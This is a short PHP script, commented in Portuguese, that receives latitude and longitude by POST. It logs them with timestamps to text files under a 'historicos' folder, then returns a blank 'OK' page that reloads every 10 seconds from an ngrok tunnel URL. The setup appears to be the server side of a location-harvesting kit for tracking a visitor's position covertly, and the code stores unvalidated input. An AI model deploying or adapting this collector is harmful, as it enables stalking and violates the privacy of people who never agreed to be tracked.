<?php

##### seta hora padrao  ######

date_default_timezone_set('America/Sao_Paulo');


##########################

$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];




$hist_lat = "\n$latitude";

$dados_lat = fopen('historicos/hist_lat.txt', 'a');

fwrite($dados_lat, $hist_lat);

fclose($dados_lat);
########################################
$hist_long = "\n$longitude";

$dados_long = fopen('historicos/hist_long.txt', 'a');

fwrite($dados_long, $hist_long);

fclose($dados_long);

########

$lat = "$latitude";

$lat_file = fopen('historicos/lat.txt', 'w');

fwrite($lat_file, $lat);

fclose($lat_file);

$long = "$longitude";

$long_file = fopen('historicos/long.txt', 'w');

fwrite($long_file, $long);

fclose($long_file);


### pega a data e hora ###
$dataehora = date('Y-m-d H:i');
$data_file = fopen('historicos/dataehora.txt', 'a');
fwrite($data_file, "\n$dataehora");
fclose($data_file);


?>

<!DOCTYPE html>
<html>
<head>
	<title>OK</title>
	<meta http-equiv="refresh" content="10; URL=https://b2699ed3960e.ngrok.io/index.php" />
</head>
<body>

</body>
</html>


 